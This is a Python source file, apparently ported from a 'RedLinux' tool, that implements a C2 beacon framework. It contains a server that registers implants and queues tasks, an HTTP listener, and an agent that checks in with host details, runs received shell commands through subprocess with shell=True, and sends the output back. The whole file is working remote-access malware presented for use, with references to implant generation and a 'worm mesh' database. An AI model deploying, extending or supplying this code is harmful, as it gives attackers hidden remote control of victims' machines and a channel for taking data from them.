#!/usr/bin/env python3
"""
GHOST_AGENT — Lightweight C2 Beacon with E2EE
Port of ghostEngine.ts from RedLinux v4.1
HTTPS-based check-in, AES-GCM encrypted task payloads, implant generation.

by 🇭🇷PhonkAlphabet
"""

import json
import logging
import os
import random
import socket
import sqlite3
import hashlib
import hmac
import time
import threading
from typing import Optional, Dict, List, Any, Callable
from dataclasses import dataclass, field
from datetime import datetime

log = logging.getLogger("ghost_agent")

DB_PATH = os.environ.get("WORM_DB_PATH", "/opt/hermes/worm_mesh_v5.db")
C2_HOST = os.environ.get("C2_HOST", "127.0.0.1")
C2_PORT = int(os.environ.get("C2_PORT", "10002"))
C2_CALLBACK_PORT = int(os.environ.get("C2_CALLBACK_PORT", "10001"))
C2_PAYLOAD_PORT = int(os.environ.get("C2_PAYLOAD_PORT", "10004"))

# ─── CRYPTO (AES-GCM) ───
try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    HAS_AESGCM = True
except ImportError:
    HAS_AESGCM = False

def _generate_key() -> bytes:
    return os.urandom(32)


def _aesgcm_encrypt(plaintext: bytes, key: bytes) -> bytes:
    """AES-256-GCM encrypt. Port of crypto.ts encrypt()."""
    if not HAS_AESGCM:
        return plaintext  # fallback: raw
    nonce = os.urandom(12)
    aesgcm = AESGCM(key)
    ct = aesgcm.encrypt(nonce, plaintext, None)
    return nonce + ct


def _aesgcm_decrypt(ciphertext: bytes, key: bytes) -> bytes:
    """AES-256-GCM decrypt."""
    if not HAS_AESGCM:
        return ciphertext
    nonce = ciphertext[:12]
    ct = ciphertext[12:]
    aesgcm = AESGCM(key)
    return aesgcm.decrypt(nonce, ct, None)


# ─── SESSION KEYS ───
_session_keys: Dict[str, bytes] = {}  # agent_id -> session key
_session_lock = threading.Lock()


# ─── DATA CLASS ───
@dataclass
class AgentTask:
    """A task queued for an agent."""
    id: int
    agent_id: str
    command: str
    args: Dict[str, Any]
    status: str  # pending | sent | completed | failed
    result: Optional[str] = None
    created_at: str = ""
    completed_at: Optional[str] = None


@dataclass
class AgentInfo:
    """Agent registration data."""
    agent_id: str
    engagement_id: int
    channel_id: int
    hostname: str = ""
    os_type: str = ""
    arch: str = ""
    ip_address: str = ""
    fingerprint: str = ""
    public_key: str = ""
    status: str = "alive"
    last_seen: str = ""
    first_seen: str = ""


# ─── GHOST C2 ENGINE ───
class GhostC2Engine:
    """C2 check-in and tasking engine.
       Port of ghostEngine.ts GhostC2Engine."""

    def __init__(self, db_path: str = DB_PATH, c2_host: str = C2_HOST,
                 c2_port: int = C2_PORT):
        self.db_path = db_path
        self.c2_host = c2_host
        self.c2_port = c2_port
        self._running = False
        self._server: Optional[Any] = None

    def _connect(self) -> sqlite3.Connection:
        conn = sqlite3.connect(self.db_path)
        conn.row_factory = sqlite3.Row
        conn.execute("PRAGMA journal_mode=WAL")
        conn.execute("PRAGMA busy_timeout=5000")
        return conn

    def establish_session(self, agent_id: str, public_key: str) -> str:
        """Establish an E2EE session key. Port of GhostC2Engine.establishSession()."""
        session_key = _generate_key()
        with _session_lock:
            _session_keys[agent_id] = session_key
        log.info(f"Session established for {agent_id}")
        return session_key.hex()

    def get_session_key(self, agent_id: str) -> Optional[bytes]:
        with _session_lock:
            return _session_keys.get(agent_id)

    def check_in(self, agent_info: AgentInfo) -> List[Dict]:
        """Agent check-in — register or update, return pending tasks.
           Port of GhostC2Engine.checkIn()."""
        conn = self._connect()
        try:
            existing = conn.execute(
                "SELECT agent_id, status FROM ghost_agents WHERE agent_id=?",
                (agent_info.agent_id,)
            ).fetchone()

            now = datetime.utcnow().isoformat()
            if existing:
                conn.execute(
                    """UPDATE ghost_agents SET last_seen=?, status='alive',
                       ip_address=COALESCE(?, ip_address),
                       hostname=COALESCE(?, hostname),
                       os_type=COALESCE(?, os_type)
                       WHERE agent_id=?""",
                    (now, agent_info.ip_address, agent_info.hostname,
                     agent_info.os_type, agent_info.agent_id)
                )
            else:
                conn.execute(
                    """INSERT INTO ghost_agents
                       (agent_id, engagement_id, channel_id, hostname, os_type, arch,
                        ip_address, fingerprint, public_key, status, first_seen, last_seen)
                       VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, 'alive', ?, ?)""",
                    (agent_info.agent_id, agent_info.engagement_id, agent_info.channel_id,
                     agent_info.hostname, agent_info.os_type, agent_info.arch,
                     agent_info.ip_address, agent_info.fingerprint, agent_info.public_key,
                     now, now)
                )
            conn.commit()

            # Fetch pending tasks
            tasks = conn.execute(
                """SELECT id, command, args, status, created_at FROM ghost_tasks
                   WHERE agent_id=? AND status='pending'
                   ORDER BY created_at ASC""",
                (agent_info.agent_id,)
            ).fetchall()

            result_tasks = []
            for t in tasks:
                task_dict = {
                    "id": t["id"],
                    "command": t["command"],
                    "args": json.loads(t["args"]) if t["args"] else {},
                }
                # Encrypt with session key if available
                sk = self.get_session_key(agent_info.agent_id)
                if sk and HAS_AESGCM:
                    payload = json.dumps(task_dict).encode()
                    encrypted = _aesgcm_encrypt(payload, sk)
                    task_dict["encrypted"] = encrypted.hex()
                result_tasks.append(task_dict)

                # Mark as sent
                conn.execute(
                    "UPDATE ghost_tasks SET status='sent', sent_at=? WHERE id=?",
                    (now, t["id"])
                )
            conn.commit()
            return result_tasks
        finally:
            conn.close()

    def submit_result(self, agent_id: str, task_id: int,
                      result: str, success: bool) -> bool:
        """Submit task result back to C2.
           Port of GhostC2Engine.submitResult()."""
        conn = self._connect()
        try:
            status = "completed" if success else "failed"
            now = datetime.utcnow().isoformat()
            conn.execute(
                """UPDATE ghost_tasks SET result=?, status=?, completed_at=?
                   WHERE id=? AND agent_id=?""",
                (result, status, now, task_id, agent_id)
            )
            conn.commit()
            # Update agent last_seen
            conn.execute(
                "UPDATE ghost_agents SET last_seen=? WHERE agent_id=?",
                (now, agent_id)
            )
            conn.commit()
            return True
        finally:
            conn.close()

    def queue_task(self, agent_id: str, command: str,
                   args: Dict[str, Any] = None) -> Optional[int]:
        """Queue a task for an agent. Port of GhostC2Engine.queueTask()."""
        conn = self._connect()
        try:
            agent = conn.execute(
                "SELECT agent_id FROM ghost_agents WHERE agent_id=?",
                (agent_id,)
            ).fetchone()
            if not agent:
                log.error(f"Agent {agent_id} not found")
                return None

            now = datetime.utcnow().isoformat()
            cur = conn.execute(
                """INSERT INTO ghost_tasks
                   (agent_id, command, args, status, created_at)
                   VALUES (?, ?, ?, 'pending', ?)""",
                (agent_id, command, json.dumps(args or {}), now)
            )
            conn.commit()
            return cur.lastrowid
        finally:
            conn.close()

    def list_agents(self, status: str = "alive") -> List[Dict]:
        """List all agents with given status."""
        conn = self._connect()
        try:
            rows = conn.execute(
                "SELECT * FROM ghost_agents WHERE status=? ORDER BY last_seen DESC",
                (status,)
            ).fetchall()
            return [dict(r) for r in rows]
        finally:
            conn.close()

    def list_pending_tasks(self) -> List[Dict]:
        """List all pending tasks across agents."""
        conn = self._connect()
        try:
            rows = conn.execute(
                """SELECT t.*, a.hostname, a.ip_address
                   FROM ghost_tasks t
                   JOIN ghost_agents a ON t.agent_id=a.agent_id
                   WHERE t.status='pending'
                   ORDER BY t.created_at ASC"""
            ).fetchall()
            return [dict(r) for r in rows]
        finally:
            conn.close()

    def generate_implant(self, channel_id: int, os_type: str = "linux",
                         arch: str = "x64") -> Dict:
        """Generate agent ID + implant metadata.
           Port of GhostC2Engine.generateImplant()."""
        agent_id = hashlib.sha256(os.urandom(32)).hexdigest()[:32]
        return {
            "agent_id": agent_id,
            "channel_id": channel_id,
            "os": os_type,
            "arch": arch,
            "compiled_at": datetime.utcnow().isoformat(),
            "signature": base64.b64encode(os.urandom(32)).decode(),
        }

    # ─── HTTP API (simple socket-based C2 listener) ───
    def start_http_listener(self, host: str = "0.0.0.0",
                            port: int = 10002) -> None:
        """Start a lightweight HTTP listener for agent check-ins.
           This is a minimal C2 server — one thread, handles GET/POST."""
        import http.server
        import socketserver

        class GhostHTTPHandler(http.server.BaseHTTPRequestHandler):
            engine_ref = self

            def do_POST(self):
                content_len = int(self.headers.get("Content-Length", 0))
                body = self.rfile.read(content_len).decode("utf-8", errors="replace")
                resp = {"status": "ok"}

                try:
                    data = json.loads(body)
                    path = self.path.rstrip("/")

                    if path == "/checkin":
                        # Check-in
                        ai = AgentInfo(**data.get("agent", {}))
                        tasks = self.engine_ref.check_in(ai)
                        resp["tasks"] = tasks
                        # Establish session if public_key provided
                        if ai.public_key:
                            sk = self.engine_ref.establish_session(ai.agent_id, ai.public_key)
                            resp["session_key"] = sk

                    elif path == "/result":
                        task_id = data.get("task_id")
                        result = data.get("result", "")
                        success = data.get("success", False)
                        agent_id = data.get("agent_id", "")
                        self.engine_ref.submit_result(agent_id, task_id, result, success)

                    elif path == "/register":
                        ai = AgentInfo(**data.get("agent", {}))
                        tasks = self.engine_ref.check_in(ai)
                        resp["tasks"] = tasks

                except Exception as e:
                    resp = {"status": "error", "error": str(e)[:80]}

                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.end_headers()
                self.wfile.write(json.dumps(resp).encode())

            def do_GET(self):
                if self.path == "/tasks":
                    tasks = self.engine_ref.list_pending_tasks()
                    self.send_response(200)
                    self.send_header("Content-Type", "application/json")
                    self.end_headers()
                    self.wfile.write(json.dumps(tasks).encode())
                elif self.path == "/agents":
                    agents = self.engine_ref.list_agents()
                    self.send_response(200)
                    self.send_header("Content-Type", "application/json")
                    self.end_headers()
                    self.wfile.write(json.dumps(agents).encode())
                else:
                    self.send_response(404)
                    self.end_headers()

            def log_message(self, fmt, *args):
                log.debug(f"C2 HTTP: {fmt % args}")

        handler = type("Handler", (GhostHTTPHandler,), {"engine_ref": self})
        self._server = socketserver.ThreadingTCPServer((host, port), handler)
        self._running = True
        log.info(f"Ghost C2 listener on {host}:{port}")
        self._server.serve_forever()

    def stop(self):
        self._running = False
        if self._server:
            self._server.shutdown()
            self._server.server_close()


# ─── GHOST AGENT CLIENT ───
class GhostAgent:
    """Agent-side client — beacon loop with task execution."""

    def __init__(self, agent_id: str, c2_host: str = C2_HOST,
                 c2_port: int = C2_PORT, interval: int = 60):
        self.agent_id = agent_id
        self.c2_host = c2_host
        self.c2_port = c2_port
        self.interval = interval
        self._running = False
        self.session_key: Optional[bytes] = None
        self.executors: Dict[str, Callable] = {}

    def register_executor(self, command: str, fn: Callable):
        """Register a handler for C2 commands."""
        self.executors[command] = fn

    def _http_post(self, path: str, data: dict) -> Optional[dict]:
        """POST JSON to C2 server."""
        try:
            import urllib.request
            import urllib.error
            payload = json.dumps(data).encode()
            req = urllib.request.Request(
                f"http://{self.c2_host}:{self.c2_port}{path}",
                data=payload,
                headers={"Content-Type": "application/json"},
                method="POST"
            )
            with urllib.request.urlopen(req, timeout=15) as resp:
                return json.loads(resp.read().decode())
        except Exception as e:
            log.warning(f"C2 POST {path} failed: {e}")
            return None

    def beacon(self) -> bool:
        """Single beacon check-in. Returns True if tasks were received."""
        agent_info = {
            "agent_id": self.agent_id,
            "hostname": socket.gethostname(),
            "ip_address": socket.gethostbyname(socket.gethostname()),
            "os_type": os.uname().sysname if hasattr(os, "uname") else "unknown",
            "arch": os.uname().machine if hasattr(os, "uname") else "unknown",
        }

        resp = self._http_post("/checkin", {"agent": agent_info})
        if not resp:
            return False

        tasks = resp.get("tasks", [])
        if resp.get("session_key"):
            try:
                self.session_key = bytes.fromhex(resp["session_key"])
            except Exception:
                pass

        for task in tasks:
            self._execute_task(task)

        return len(tasks) > 0

    def _execute_task(self, task: dict):
        """Execute a single task from C2."""
        cmd = task.get("command", "")
        args = task.get("args", {})
        task_id = task.get("id")
        encrypted = task.get("encrypted")

        # Decrypt if encrypted
        if encrypted and self.session_key and HAS_AESGCM:
            try:
                decrypted = _aesgcm_decrypt(bytes.fromhex(encrypted), self.session_key)
                task.update(json.loads(decrypted.decode()))
                cmd = task.get("command", cmd)
                args = task.get("args", args)
            except Exception:
                pass

        handler = self.executors.get(cmd)
        if not handler:
            log.warning(f"No handler for command: {cmd}")
            self._http_post("/result", {
                "agent_id": self.agent_id,
                "task_id": task_id,
                "result": f"Unknown command: {cmd}",
                "success": False
            })
            return

        try:
            result = handler(**args)
            self._http_post("/result", {
                "agent_id": self.agent_id,
                "task_id": task_id,
                "result": json.dumps(result),
                "success": True
            })
        except Exception as e:
            self._http_post("/result", {
                "agent_id": self.agent_id,
                "task_id": task_id,
                "result": str(e),
                "success": False
            })

    def start_beacon_loop(self):
        """Continuous beacon loop. Runs until stop()."""
        self._running = True
        log.info(f"Ghost agent {self.agent_id} beacon loop started (interval={self.interval}s)")
        while self._running:
            try:
                self.beacon()
            except Exception as e:
                log.error(f"Beacon error: {e}")
            time.sleep(self.interval)

    def stop_beacon(self):
        self._running = False


# ─── CLI ───
if __name__ == "__main__":
    import sys, base64
    logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(name)s] %(levelname)s: %(message)s")

    if len(sys.argv) > 1 and sys.argv[1] == "server":
        engine = GhostC2Engine()
        try:
            engine.start_http_listener()
        except KeyboardInterrupt:
            engine.stop()
    elif len(sys.argv) > 1 and sys.argv[1] == "agent":
        agent_id = sys.argv[2] if len(sys.argv) > 2 else hashlib.sha256(os.urandom(16)).hexdigest()[:16]
        interval = int(sys.argv[3]) if len(sys.argv) > 3 else 60
        agent = GhostAgent(agent_id, interval=interval)
        # Register default executor for "exec" commands
        import subprocess
        agent.register_executor("exec", lambda cmd, **kw: subprocess.check_output(cmd, shell=True, timeout=30).decode())
        agent.register_executor("ping", lambda: "pong")
        try:
            agent.start_beacon_loop()
        except KeyboardInterrupt:
            agent.stop_beacon()
    elif len(sys.argv) > 2 and sys.argv[1] == "queue":
        engine = GhostC2Engine()
        task_id = engine.queue_task(sys.argv[2], sys.argv[3], {"cmd": " ".join(sys.argv[4:])} if len(sys.argv) > 4 else {})
        print(f"Task queued: {task_id}")
    elif len(sys.argv) > 1 and sys.argv[1] == "agents":
        engine = GhostC2Engine()
        agents = engine.list_agents()
        print(json.dumps(agents, indent=2))
    else:
        print(f"Usage: {sys.argv[0]} [server|agent|queue|agents] [args...]")
